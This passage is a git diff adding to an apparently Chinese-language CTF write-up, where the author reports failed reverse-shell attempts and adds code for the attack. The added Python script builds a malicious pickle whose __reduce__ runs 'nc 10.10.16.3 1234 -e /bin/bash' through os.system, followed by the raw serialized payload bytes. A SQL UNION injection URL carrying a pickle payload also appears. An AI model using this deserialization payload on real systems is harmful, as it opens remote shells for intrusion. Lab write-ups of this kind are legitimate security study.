@@ -122,3 +122,31 @@ http://157.245.43.189:31047/view/'%20UNION%20SELECT%20'gASVOwAAAAAAAACMBXBvc2l4l
 不知道是这道题的问题还是网络的问题
 
 在kali上始终没办法成功反弹，构造payload利用ping和curl尝试触达kali机器，也失败。因此网络问题可能是无法反弹shell的原因。
+
+
+
+```python
+import pickle
+import base64
+import os
+
+payload = 'nc 10.10.16.3 1234 -e /bin/bash'
+
+class RCE:
+    def __reduce__(self):
+        return os.system, (payload,)
+
+if __name__ == '__main__':
+    print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode('ascii'))
+```
+
+
+
+
+
+```bash
+b'\x80\x03cnt\nsystem\nq\x00X\x1f\x00\x00\x00nc 10.10.16.3 1234 -e /bin/bashq\x01\x85q\x02Rq\x03.'
+
+b'\x80\x04\x95:\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x1fnc 10.10.16.3 1234 -e /bin/bash\x94\x85\x94R\x94.'
+```
+
